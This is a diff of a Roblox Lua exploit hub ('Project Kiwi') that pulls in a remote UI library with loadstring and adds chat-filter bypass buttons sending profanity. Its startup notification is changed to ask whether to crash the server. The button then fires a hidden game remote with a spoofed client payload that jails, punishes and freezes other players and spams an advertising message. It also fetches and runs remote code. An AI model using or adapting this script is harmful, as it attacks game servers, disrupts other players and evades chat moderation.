@@ -1,3 +1,6 @@
+
+
+
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 
 local Window =
@@ -24,16 +27,19 @@ local Window =
             FileName = "Admin house 🥝 | Key System", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
             SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
             GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
-            Key = {"XH tryna चाबी को क्रैक करें", "adsf-haisj-uai882-7wujsh-771y2"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
+            Key = {"⁬ᓝ⻙ₙᆟ⚯᎝⇌ኊⰶ࿎๖⠸഑ᇰᷱᐶᛴᵒඹᜟ⿱ᣝ⥑ᐃⵘᐵ᪌②⽁᪬⚙ᛚഽ⇁வᵼืẂ⩪῟࿭⹘⌶ሞ⎳૕ᴟቨ⟧಩ᖃ᎒ᾉ൱ጸᣚധ⊹ᜯ⊾ᖩ♞⸐⢥ḭদ⑒⢥ଝ๧໮᦯ᱡỎᙬஷ♚ಸ‌ỤྻᏴ⫈⒕ၢ⻀ᵾᙎᨐᶾᓅ὎ᴀ⯎ᖧ᮶ಢ␷Ꮖ"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
         }
     }
 )
+
+
 
 local MainTab = Window:CreateTab("🏠 Home 🏠", nil) -- Title, Image
 local BypassTab = Window:CreateTab("📜 Bypasses 📜", nil) -- Title, Image
 local ScriptTab = Window:CreateTab("📜 Scripts 📜", nil) -- Title, Image
 local CrashesTab = Window:CreateTab("💥 Crashes 💥", nil) -- Title, Image
 local MainSection = MainTab:CreateSection("Main")
+
 
 local Warning = MainTab:CreateLabel([[THIS SCRIPT IS IN BETA SO EXPECT SOME BUGS
 - Project Kiwi]])
@@ -106,9 +112,9 @@ local Tphouse =
 local IY =
     ScriptTab:CreateButton(
     {
-        Name = "Infinite Yield",
+        Name = "Infinite Yield (Disabled For Now)",
         Callback = function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
+            --loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
         end
     }
 )
@@ -148,21 +154,30 @@ local ChatBypass =
     {
         Name = "Fuck",
         Callback = function()
-            function getNil(name,class) for _,v in next, getnilinstances() do if v.ClassName==class and v.Name==name then return v;end end end
-
-local args = {
-    [1] = {
-        ["Received"] = 66,
-        ["Loader"] = getNil("ClientMover", "LocalScript"),
-        ["Sent"] = 11,
-        ["Module"] = getNil("Client", "ModuleScript"),
-        ["Mode"] = "Fire"
-    },
-    [2] = "7*#\24!(&v'#V\23U\28",
-    [3] = ":talk me F\195\188ck"
+            local args = {
+    [1] = "Fück",
+    [2] = "All"
 }
 
-game:GetService("JointsService"):WaitForChild("591309450a"):FireServer(unpack(args))
+game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
+
+
+        end
+    }
+)
+
+local ChatBypass1 =
+    BypassTab:CreateButton(
+    {
+        Name = "im a porn addict",
+        Callback = function()
+            local args = {
+    [1] = "im a phorn addict",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
+
 
         end
     }
@@ -234,15 +249,36 @@ game:GetService("JointsService"):WaitForChild("591309450a"):FireServer(unpack(ar
 Rayfield:Notify(
     {
         Title = "Project Kiwi Hub 🥝",
-        Content = "In Building 🔨",
+        Content = "Do you want to crash this server now?",
         Duration = 5,
         Image = 13047715178,
         Actions = {
             -- Notification Buttons
             Ignore = {
-                Name = "Okay!🥖",
+                Name = "y e s🥖",
                 Callback = function()
-                    print("The user tapped Okay!")
+                    function getNil(name,class) for _,v in next, getnilinstances() do if v.ClassName==class and v.Name==name then return v;end end end
+
+local args = {
+    [1] = {
+        ["Received"] = 66,
+        ["Loader"] = getNil("ClientMover", "LocalScript"),
+        ["Sent"] = 13,
+        ["Module"] = getNil("Client", "ModuleScript"),
+        ["Mode"] = "Fire"
+    },
+    [2] = "7*#\24!(&v'#V\23U\28",
+    [3] = ":fogcolor 0 255 0 | :fog 10 100 | :tphouse | :char me awaken | :setmessage Get crashed by Kiwi Proje" ..
+        "ct [\240\159\165\157]  D\194\161s\209\129\208\190\208\179d.\196\157\196\157/BvcmUh56EX" ..
+        " and [L] XH Clan | :sm Server Has Been Taken Away By Kiwi Project and XH clan copied t" ..
+        "his xD | :chatnotifyc all 0 200 0 Get crashed by Kiwi Project [\240\159\165\157] D\194" ..
+        "\161s\209\129\208\190\208\179d.\196\157\196\157/BvcmUh56EX / XH copied this xD| :music" ..
+        " 6819593773 | :name me Get crashed by Kiwi Project [\240\159\165\157] D\194\161s\209\129" ..
+        "\208\190\208\179d.\196\157\196\157/BvcmUh56EX [L] XH Clan | :bring all | :jail other" ..
+        "s | :punish others  | :loadb InvFreeze"
+}
+
+game:GetService("JointsService"):WaitForChild("591309450a"):FireServer(unpack(args))
                 end
             }
         }
